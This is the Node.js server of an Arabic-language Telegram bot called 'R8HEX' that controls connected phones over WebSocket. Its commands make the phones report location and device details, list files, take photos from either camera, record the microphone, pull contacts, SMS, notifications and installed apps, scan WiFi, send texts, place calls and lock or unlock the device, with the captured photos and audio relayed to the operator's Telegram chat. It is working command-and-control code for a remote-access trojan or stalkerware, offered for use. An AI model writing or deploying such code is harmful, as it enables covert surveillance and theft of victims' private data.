const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const { token, id } = require('./data');
const axios = require('axios');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const bot = new TelegramBot(token, { polling: true });
const wss = new WebSocket.Server({ port: 8080 });

// تخزين البيانات
const connectedPhones = new Map();
const userSessions = new Map();

// 🔧 **الأوامر الأساسية للبوت**
bot.setMyCommands([
    { command: 'start', description: 'بدء النظام' },
    { command: 'info', description: 'معلومات الجهاز' },
    { command: 'location', description: 'موقع الجهاز' },
    { command: 'sms', description: 'إرسال رسالة' },
    { command: 'call', description: 'إجراء مكالمة' },
    { command: 'camera', description: 'التقاط صورة' },
    { command: 'microphone', description: 'تسجيل صوت' },
    { command: 'files', description: 'استعراض الملفات' },
    { command: 'contacts', description: 'قائمة الاتصالات' },
    { command: 'messages', description: 'الرسائل النصية' },
    { command: 'notifications', description: 'الإشعارات' },
    { command: 'apps', description: 'التطبيقات المثبتة' },
    { command: 'battery', description: 'حالة البطارية' },
    { command: 'wifi', description: 'شبكات WiFi' },
    { command: 'lock', description: 'قفل الجهاز' },
    { command: 'unlock', description: 'فتح الجهاز' }
]);

// 🎯 **معالج الأمر /start**
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    const welcomeMessage = `
🎮 **R8HEX - نظام التحكم في الهاتف**

📱 **أوامر التحكم الأساسية**:

📍 **الموقع والمعلومات**:
/info - معلومات الجهاز
/location - الموقع الحالي
/battery - حالة البطارية

📞 **الاتصالات**:
/call [رقم] - إجراء مكالمة
/sms [رقم] [نص] - إرسال رسالة
/contacts - قائمة الاتصالات

📁 **الملفات والوسائط**:
/files [مسار] - استعراض الملفات
/camera [أمامي|خلفي] - التقاط صورة
/microphone [ثواني] - تسجيل صوت

📲 **التطبيقات والإشعارات**:
/apps - التطبيقات المثبتة
/notifications - الإشعارات الأخيرة
/messages - الرسائل النصية

🌐 **الشبكات**:
/wifi - شبكات WiFi المتاحة

🔒 **التحكم**:
/lock - قفل الجهاز
/unlock - فتح الجهاز

⚡ **مطور النظام**: @A1BUG
    `;
    
    bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
});

// 🔌 **معالج اتصالات WebSocket**
wss.on('connection', (ws, req) => {
    console.log('📱 هاتف جديد متصل');
    
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            handlePhoneMessage(ws, message);
        } catch (error) {
            console.error('❌ خطأ في معالجة الرسالة:', error);
        }
    });

    ws.on('close', () => {
        // إزالة الهاتف من القائمة عند انقطاع الاتصال
        for (let [phoneId, connection] of connectedPhones.entries()) {
            if (connection === ws) {
                connectedPhones.delete(phoneId);
                console.log(`📱 الهاتف ${phoneId} انقطع`);
                break;
            }
        }
    });
});

// 📨 **معالج رسائل الهاتف**
function handlePhoneMessage(ws, message) {
    switch (message.type) {
        case 'register':
            // تسجيل الهاتف
            connectedPhones.set(message.phoneId, ws);
            console.log(`✅ هاتف مسجل: ${message.phoneId}`);
            break;
            
        case 'location':
            // معالجة بيانات الموقع
            sendToTelegram(message.chatId, `
📍 **الموقع الحالي**:
🌍 الإحداثيات: ${message.lat}, ${message.lng}
🏠 العنوان: ${message.address || 'غير متوفر'}
📶 الدقة: ${message.accuracy || 'غير معروف'} متر
            `);
            break;
            
        case 'device_info':
            // معلومات الجهاز
            sendToTelegram(message.chatId, `
📱 **معلومات الجهاز**:
📟 النموذج: ${message.model}
🔢 الإصدار: ${message.version}
📲 الرقم التسلسلي: ${message.serial}
💾 الذاكرة: ${message.memory}
🖥️ الشاشة: ${message.display}
            `);
            break;
            
        case 'file_list':
            // قائمة الملفات
            let filesMessage = '📁 **الملفات**:\n\n';
            message.files.forEach(file => {
                filesMessage += `${file.isDir ? '📁' : '📄'} ${file.name}\n`;
                if (!file.isDir) {
                    filesMessage += `   📏 ${formatSize(file.size)}\n`;
                }
            });
            sendToTelegram(message.chatId, filesMessage);
            break;
            
        case 'photo':
            // إرسال الصورة
            if (message.photo) {
                const photoBuffer = Buffer.from(message.photo, 'base64');
                bot.sendPhoto(message.chatId, photoBuffer, {
                    caption: message.caption || '📸 الصورة الملتقطة'
                });
            }
            break;
            
        case 'audio':
            // إرسال التسجيل الصوتي
            if (message.audio) {
                const audioBuffer = Buffer.from(message.audio, 'base64');
                bot.sendAudio(message.chatId, audioBuffer, {
                    caption: message.caption || '🎙️ التسجيل الصوتي'
                });
            }
            break;
            
        case 'response':
            // ردود عامة
            sendToTelegram(message.chatId, `📨 ${message.text}`);
            break;
    }
}

// 📍 **أمر الموقع**
bot.onText(/\/location/, (msg) => {
    const chatId = msg.chat.id;
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'get_location', { chatId });
        bot.sendMessage(chatId, '📍 جاري الحصول على الموقع...');
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 📱 **أمر معلومات الجهاز**
bot.onText(/\/info/, (msg) => {
    const chatId = msg.chat.id;
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'get_device_info', { chatId });
        bot.sendMessage(chatId, '📊 جاري جمع معلومات الجهاز...');
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 📞 **أمر المكالمات**
bot.onText(/\/call (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const phoneNumber = match[1];
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'make_call', { 
            chatId,
            number: phoneNumber 
        });
        bot.sendMessage(chatId, `📞 جاري الاتصال بـ: ${phoneNumber}`);
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 💬 **أمر الرسائل النصية**
bot.onText(/\/sms (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const phoneNumber = match[1];
    const message = match[2];
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'send_sms', { 
            chatId,
            number: phoneNumber,
            message: message 
        });
        bot.sendMessage(chatId, `📩 جاري إرسال رسالة إلى: ${phoneNumber}`);
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 📷 **أمر الكاميرا**
bot.onText(/\/camera( (front|back))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const cameraType = match[2] || 'back';
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'capture_photo', { 
            chatId,
            camera: cameraType 
        });
        bot.sendMessage(chatId, `📷 جاري التقاط صورة من الكاميرا ${cameraType === 'front' ? 'الأمامية' : 'الخلفية'}`);
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 🎙️ **أمر الميكروفون**
bot.onText(/\/microphone( (\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const duration = parseInt(match[2]) || 10;
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'record_audio', { 
            chatId,
            duration: duration 
        });
        bot.sendMessage(chatId, `🎙️ جاري التسجيل لمدة ${duration} ثانية`);
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 📁 **أمر الملفات**
bot.onText(/\/files( (.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const directory = match[2] || '/sdcard/';
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'list_files', { 
            chatId,
            path: directory 
        });
        bot.sendMessage(chatId, `📁 جاري استعراض الملفات في: ${directory}`);
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 👥 **أمر جهات الاتصال**
bot.onText(/\/contacts/, (msg) => {
    const chatId = msg.chat.id;
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'get_contacts', { chatId });
        bot.sendMessage(chatId, '👥 جاري جلب قائمة الاتصالات...');
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 💬 **أمر الرسائل النصية للجهاز**
bot.onText(/\/messages/, (msg) => {
    const chatId = msg.chat.id;
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'get_messages', { chatId });
        bot.sendMessage(chatId, '💬 جاري جلب الرسائل النصية...');
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 🔔 **أمر الإشعارات**
bot.onText(/\/notifications/, (msg) => {
    const chatId = msg.chat.id;
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'get_notifications', { chatId });
        bot.sendMessage(chatId, '🔔 جاري جلب الإشعارات الأخيرة...');
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 📲 **أمر التطبيقات**
bot.onText(/\/apps/, (msg) => {
    const chatId = msg.chat.id;
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'get_apps', { chatId });
        bot.sendMessage(chatId, '📲 جاري جلب قائمة التطبيقات...');
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 🔋 **أمر البطارية**
bot.onText(/\/battery/, (msg) => {
    const chatId = msg.chat.id;
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'get_battery', { chatId });
        bot.sendMessage(chatId, '🔋 جاري التحقق من حالة البطارية...');
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 🌐 **أمر شبكات WiFi**
bot.onText(/\/wifi/, (msg) => {
    const chatId = msg.chat.id;
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'get_wifi', { chatId });
        bot.sendMessage(chatId, '🌐 جاري مسح شبكات WiFi...');
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 🔒 **أمر قفل الجهاز**
bot.onText(/\/lock/, (msg) => {
    const chatId = msg.chat.id;
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'lock_device', { chatId });
        bot.sendMessage(chatId, '🔒 جاري قفل الجهاز...');
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 🔓 **أمر فتح الجهاز**
bot.onText(/\/unlock/, (msg) => {
    const chatId = msg.chat.id;
    const phone = getPhoneByChat(chatId);
    
    if (phone) {
        sendCommand(phone, 'unlock_device', { chatId });
        bot.sendMessage(chatId, '🔓 جاري فتح الجهاز...');
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل');
    }
});

// 🛠️ **الدوال المساعدة**
function sendCommand(phone, command, data = {}) {
    if (phone.readyState === WebSocket.OPEN) {
        const message = {
            type: 'command',
            command: command,
            data: data
        };
        phone.send(JSON.stringify(message));
        return true;
    }
    return false;
}

function getPhoneByChat(chatId) {
    // في هذا المثال، نفترض أن chatId هو نفسه phoneId
    // يمكنك تعديل هذا حسب نظام التعريف الخاص بك
    return connectedPhones.get(chatId.toString());
}

function sendToTelegram(chatId, message) {
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
}

function formatSize(bytes) {
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    if (bytes === 0) return '0 Bytes';
    const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)));
    return Math.round(bytes / Math.pow(1024, i) * 100) / 100 + ' ' + sizes[i];
}

// 🚀 **تشغيل الخادم**
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 R8HEX Server running on port ${PORT}`);
    console.log(`🤖 Bot: @${bot.options.username}`);
    console.log(`📱 WebSocket: ws://localhost:8080`);
});

module.exports = app;
